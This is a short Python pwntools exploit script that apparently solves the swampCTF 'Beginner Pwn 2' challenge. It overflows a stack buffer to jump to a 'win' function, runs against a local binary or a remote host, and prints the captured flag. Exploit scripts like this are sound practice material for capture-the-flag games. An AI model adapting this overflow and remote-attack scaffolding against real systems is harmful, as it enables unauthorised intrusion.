#!/usr/bin/env python3

from pwn import *
import argparse
import sys

BUFFER_OFFSET = 0x12

def build_payload(win_addr):
    payload  = b"A" * BUFFER_OFFSET
    payload += p64(win_addr)
    return payload

def run_local(path):
    print(f"[*] Running locally: {path}")
    elf = ELF(path)
    context.binary = elf
    return elf, process(path)

def run_remote(host, port, path):
    print(f"[*] Connecting to {host}:{port}")
    elf = ELF(path)
    context.binary = elf
    return elf, remote(host, port)

def main():
    parser = argparse.ArgumentParser(description="Exploit for Beginner Pwn 2")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    # Local mode
    local_parser = subparsers.add_parser("local")
    local_parser.add_argument("binary", type=str, help="Path to the local binary")

    # Remote mode
    remote_parser = subparsers.add_parser("remote")
    remote_parser.add_argument("ip", type=str, help="Remote IP")
    remote_parser.add_argument("port", type=int, help="Remote port")
    remote_parser.add_argument("binary", type=str, help="Path to binary for symbol resolution")

    args = parser.parse_args()

    # Setup
    if args.mode == "local":
        elf, io = run_local(args.binary)
    else:
        elf, io = run_remote(args.ip, args.port, args.binary)

    # Build and send payload
    win_addr = elf.symbols["win"]
    payload = build_payload(win_addr)

    io.sendline(payload)

    # Extract flag
    try:
        io.readuntil(b"swampCTF{")
        flag = "swampCTF{" + io.readuntil(b"}").decode()
        print(f"[+] Flag: {flag}")
    except:
        print("[-] Failed to capture flag.")
        io.interactive()

    io.close()

if __name__ == "__main__":
    main()

